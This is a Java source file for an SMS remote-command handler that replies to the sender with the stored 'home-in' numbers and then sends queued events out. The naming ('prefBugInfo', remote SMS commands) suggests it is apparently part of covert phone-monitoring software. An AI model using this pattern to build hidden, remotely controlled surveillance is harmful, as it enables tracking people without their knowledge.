package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSQueryHomeInNumb extends RmtCmdSync {

	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSQueryHomeInNumb(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	public void execute(RmtCmdExecutionListener rmtCmdProcessingManager) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getQueryHomeInNumberCmd());
		try {
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.HOMEIN);
			int countHomeIn = prefBugInfo.countHomeInNumber();
			for (int i = 0; i < countHomeIn; i++) {
				responseMessage.append(Constant.CRLF);
				responseMessage.append(prefBugInfo.getHomeInNumber(i));				
			}
		} catch(Exception e) {
			Log.error("SMSQueryHomeInNumberCmd.execute()", e.getMessage());
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("SMSQueryHomeInNumberCmd.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
